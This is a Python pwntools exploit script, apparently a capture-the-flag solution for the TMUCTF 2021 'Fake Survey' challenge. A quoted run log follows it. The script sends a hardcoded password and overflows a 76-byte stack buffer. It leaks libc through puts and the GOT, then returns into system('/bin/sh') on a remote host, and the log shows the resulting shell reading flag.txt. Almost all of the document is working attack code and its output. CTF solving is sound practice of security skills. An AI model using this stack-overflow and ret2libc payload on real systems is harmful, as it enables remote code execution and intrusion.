from pwn import *

#context(os='linux', arch='i386')
#context.log_level = 'debug'

BINARY = './fakesurvey'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "185.235.41.205"
  PORT = 7050
  s = remote(HOST, PORT)
  libc = ELF("libc6-i386_2.31-0ubuntu9.1_amd64.so")
else:
  s = process(BINARY)
  libc = elf.libc

s.sendlineafter("Enter password:\n", "CPRSyRMOFa3FVIF")

s.recvuntil("Now tell us your opinions about the competition :)")

puts_plt_addr = 0x080490a0

buf  = "A"*76
buf += p32(puts_plt_addr)
buf += p32(elf.sym.main)
buf += p32(elf.got.puts)
s.sendline(buf)

s.recvuntil("*** Thanks for sharing your opinions with us ***\n")
puts_addr   = u32(s.recv(4))
libc_base   = puts_addr - libc.sym.puts
system_addr = libc_base + libc.sym.system
binsh_addr  = libc_base + next(libc.search('/bin/sh'))

print "puts_addr =", hex(puts_addr)
print "libc_base =", hex(libc_base)

s.sendlineafter("Enter password:\n", "CPRSyRMOFa3FVIF")

s.recvuntil("Now tell us your opinions about the competition :)")
buf  = "A"*76
buf += p32(system_addr)
buf += "B"*4
buf += p32(binsh_addr)
s.sendline(buf)

s.interactive()

'''
mito@ubuntu:~/CTF/TMUCTF_2021/Pwn_Fake_Survey$ python solve.py r
[*] '/home/mito/CTF/TMUCTF_2021/Pwn_Fake_Survey/fakesurvey'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Opening connection to 185.235.41.205 on port 7050: Done
[*] '/home/mito/CTF/TMUCTF_2021/Pwn_Fake_Survey/libc6-i386_2.31-0ubuntu9.1_amd64.so'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
puts_addr = 0xf7d6f290
libc_base = 0xf7cfe000
[*] Switching to interactive mode


*** Thanks for sharing your opinions with us ***
$ id
/bin/sh: 1: id: not found
$ ls -l
total 48
drwxr-x--- 1 0 1000  4096 Sep  7 14:04 bin
drwxr-x--- 1 0 1000  4096 Sep  7 14:04 dev
-rwxr-x--- 1 0 1000 15952 Sep  7 12:25 fakesurvey
-rwxr----- 1 0 1000    59 Sep  7 13:59 flag.txt
drwxr-x--- 1 0 1000  4096 Sep  7 14:04 lib
drwxr-x--- 1 0 1000  4096 Sep  7 14:04 lib32
drwxr-x--- 1 0 1000  4096 Sep  7 14:04 lib64
drwxr-x--- 1 0 1000  4096 Sep  7 14:04 libx32
-rwxr-x--- 1 0 1000    15 Aug 21 12:32 passPhrase
$ cat flag.txt
TMUCTF{m4yb3_y0u_u53d_7h3_574ck_4nd_r37urn3d_70_dl_r350lv3}
'''
